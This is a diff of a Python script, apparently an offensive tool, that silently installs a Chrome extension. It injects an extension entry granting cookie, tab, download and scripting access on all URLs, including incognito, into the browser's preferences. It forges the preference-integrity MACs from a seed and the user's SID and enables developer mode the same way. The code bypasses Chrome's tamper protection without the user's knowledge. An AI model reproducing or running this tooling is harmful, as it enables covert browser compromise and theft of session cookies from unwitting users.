@@ -138,7 +138,7 @@ def add_extension():
     print("Sid is", sid)
     user = os.getlogin()
     print("User is", user)
-    #input()
+    #input() #only for testing purposes
     extpath = "C:\\Yourpath\\here" #fill in path to your extension dir, make sure to leave off trailing slash
     extensionid=get_extension_id(extpath)
     ###add json to file
@@ -146,7 +146,7 @@ def add_extension():
     #dynamically change first_install_time and last_update_time
     given_date = datetime.datetime.now()
     encoded_install_time = encode_to_install_time(given_date)
-    extension_json=r'{"active_permissions":{"api":["activeTab","cookies","debugger","webNavigation","webRequest","scripting"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":[]},"commands":{},"content_settings":[],"creation_flags":38,"filtered_service_worker_events":{"webNavigation.onCompleted":[{}]},"first_install_time":"%s","from_webstore":false,"granted_permissions":{"api":["activeTab","cookies","debugger","webNavigation","webRequest","scripting"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":[]},"incognito_content_settings":[],"incognito_preferences":{},"last_update_time":"%s","location":4,"newAllowFileAccess":true,"path":"","preferences":{},"regular_only_preferences":{},"service_worker_registration_info":{"version":"0.1.0"},"serviceworkerevents":["cookies.onChanged","webRequest.onBeforeRequest/s1"],"state":1,"was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}' % (encoded_install_time, encoded_install_time)
+    extension_json=r'{"account_extension_type":0,"active_permissions":{"api":["cookies","storage","tabs","scripting"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":[]},"commands":{},"content_settings":[],"creation_flags":38,"first_install_time":"%s","from_webstore":false,"granted_permissions":{"api":["cookies","downloads","storage","tabs"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":[]},"incognito":true,"incognito_content_settings":[],"incognito_preferences":{},"last_update_time":"%s","location":4,"newAllowFileAccess":true,"path":"","preferences":{},"regular_only_preferences":{},"service_worker_registration_info":{"version":"1.0"},"serviceworkerevents":["tabs.onUpdated"],"was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}' % (encoded_install_time, encoded_install_time)
     
     #convert to ordereddict for calc and addition
     dict_extension=json.loads(extension_json, object_pairs_hook=OrderedDict)
@@ -182,7 +182,7 @@ def add_extension():
     pref_path = "extensions.ui.developer_mode"
     pref_value = True
     mac = calculate_chrome_dev_mac(seed, sid, pref_path, pref_value)
-    print(mac)
+    #print(mac)
     data["protection"]["macs"]["extensions"]["ui"]["developer_mode"]=mac
     devmode_value=r'{"developer_mode": true}'
     parseddevmode=json.loads(devmode_value, object_pairs_hook=OrderedDict)
